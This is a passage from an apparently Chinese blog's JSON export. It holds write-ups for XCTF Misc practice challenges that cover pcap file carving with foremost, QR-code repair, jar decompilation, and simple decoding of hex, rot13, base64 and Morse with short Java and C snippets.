的信息（2）根据筛选出的报文，追踪tcp流，在第1150个报文中发现一串十六进制的流信息，其中，FFD8是jpg文件头标志，FFD9是结束标志，说明这里有一张jpg格式的图片。（3）将这部分信息复制到一个文本文档.txt中保存，用010 editor工具以十六进制导入，并另存为jpg格式，得到一张图片（4）接着在kali中用foremost分离附件.pcapng文件，得到一个zip文件，里面有一个压缩包，包含flag文件。使用上面图片中的“Th1s_1s_p4sswd_!!!”作为密码，获取flag。 #foremost已在kali中预安装，使用如下命令安装 $sudo apt-get install foremost //非管理员需要加上sudo #分离文件 $foremost -t all ctf.pcapng #执行完上面的语句后，会生成一个output目录，进入该目录即可查看分离的文件。 give_you_flag（1）附件是一张gif的动图，查看后可发现图片里存在一个二维码。于是这里用stegsolve工具将动图分解为一张张图片，以便查看。（2）找到那张出现二维码的图片，发现定位点缺失。百度下载一张二维码定位点图片，接着打开Windows自带的画图工具，选择“新建”，然后依次把定位点图片和二维码图片通过“粘贴来源“导入，将定位点拖拽到缺失的地方，保存即可。（不会ps只能这样了，嘤嘤嘤~）#下载的定位点图片可能会有一些白色边框，在合成图片时可能会覆盖掉二维码。同样可以在画图工具里，打开定位点图片，通过多次“旋转”的操作，然后不断调整白色画布的大小去掉边框，去掉边框后保存就可以了。（3）二维码图片补全后，用二维码扫描器扫描就可以得到flag了。 #stegsolve工具：File Format:文件格式，这个主要是查看图片的具体信息Data Extract:数据抽取，图片中隐藏数据的抽取Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看Image Combiner:拼图，图片拼接#stegsolve打开方式：（1）首先需要添加java环境，这里就不赘述了。（2）打开stegsolve所在目录，在目录框输入cmd，打开运行窗口（3）在运行窗口输入以下命令即可打开： java -jar stegsolve.jar 坚持60s（1）附件是一个.jar文件，在cmd下用java -jar xxxx.jar查看（2）用jd-gui工具反编译，在cn.bjsxt.plane.PlaneGameFrame.class文件下发现flag（Ctrl+F搜索） gif（1）解压附件，在gif文件夹下看到许多黑白的图片，联想到二进制（2）将各个图片转化为对应的二进制，使用在线二进制转字符串工具http://www.txttool.com/WenBen_BinaryStr.asp即可得到flag。 掀桌子（1）获取的报文内容为0-9，a-f，考虑十六进制。但该串十六进制数无法直接转化为字符串（ASCII值）（2）把十六进制两两一组转换为十进制；接着将十进制数减去128（因为ASCII码值为0~127），让其落到ASCII码表上，然后计算出对应ASCII码值的字符，获取flag。（3）采用如下java编写的代码： public class Misc &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub String hex=&quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;; String temp=&quot;&quot;; String flag=&quot;&quot;; for(int i = 0; i &lt; hex.length();i+=2) &#123; temp=hex.substring(i,i+2); //获取相邻的字符 long dec=Long.parseLong(temp,16); //将两个字符转换为十进制 flag=Long.toString(dec-128); //将Long型的十进制值减去128，再转换为String System.out.print((char)Integer.parseInt(flag)); //解析flag为十进制整数，并强制转换为char，存取字符 &#125; &#125; &#125; （4）查看执行结果 如来十三掌（1）附件是一串禅语（2）使用在线工具使用“与佛论禅”来进行解码（解码时记得在原文字的开头加上“佛曰：”）在线工具：http://www.keyfc.net/bbs/tools/tudoucode.aspx（3）根据题目提示的13掌，用rot-13解码 #rot13使用一个简单的替换加密算法，类似凯撒密码（4）又是一串密文，用base64试试，看到flag。 stegano（1）附件是一个pdf文件，全选后复制到一个word文档里，发现了一串特殊的字符（2）看到AB，但不是培根密码，培根密码是5个一组，联想到摩斯密码将A替换为. ，B替换为-，可以自己写个代码转换一下（这里我用的c语言） int main()&#123; char word[200]; gets(word); int i=0; while(word[i] != 0)&#123; if(word[i] == &#39;A&#39;)&#123; word[i]=&#39;.&#39;; printf(&quot;%c&quot;,word[i]); &#125; if(word[i] == &#39; &#39;)&#123; printf(&quot; &quot;); &#125; if(word[i] == &#39;B&#39;)&#123; word[i]=&#39;-&#39;; printf(&quot;%c&quot;,word[i]); &#125; // printf(&quot;%s&quot;,word[i]); i++; &#125; system(&quot;pause&quot;); return 0; （3）然后放到在线摩斯密码加解密上解密http://www.txttool.com/t/?id=Mzg1（注意分割的时候空格也要输入） SimpleRAR（1）解压附件得到一张两帧的图片（2）现将这两帧图片分别保存，然后用stegsolve分别打开，发现是都是缺失一半的二维码图片（3）利用画图工具，将两张图拼在一起，并将定位点补充完整，用二维码扫描器扫描即可","categories":[{"name":"XCTF_Misc练习区","slug":"XCTF-Misc练习区","permalink":"http://example.com/categories/XCTF-Misc%E7%BB%83%E4%B9%A0%E5%8C%BA/"}],"tags":[{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]}],"categories":[{"name":"BugkuCTF_杂项","slug":"BugkuCTF-杂项","permalink":"http://example.com/categories/BugkuCTF-%E6%9D%82%E9%A1%B9/"},{"name":"BugkuCTF_Web","slug":"BugkuCTF-Web","permalink":"http://example.com/categories/BugkuCTF-Web/"},{"name":"XCTF_Misc进阶区","slug":"XCTF-Misc进阶区","permalink":"http://example.com/categories/XCTF-Misc%E8%BF%9B%E9%98%B6%E5%8C%BA/"},{"name":"XCTF_Web进阶区","slug":"XCTF-Web进阶区","permalink":"http://example.com/categories/XCTF-Web%E8%BF%9B%E9%98%B6%E5%8C%BA/"},{"name":"XCTF_Web练习区","slug":"XCTF-Web练习区","permalink":"http://example.com/categories/XCTF-Web%E7%BB%83%E4%B9%A0%E5%8C%BA/"},{"name":"XCTF_Misc练习区","slug":"XCTF-Misc练习区","permalink":"http://example.com/categories/XCTF-Misc%E7%BB%83%E4%B9%A0%E5%8C%BA/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"},{"name":"CTF靶场","slug":"CTF靶场","permalink":"http://example.com/tags/CTF%E9%9D%B6%E5%9C%BA/"}]}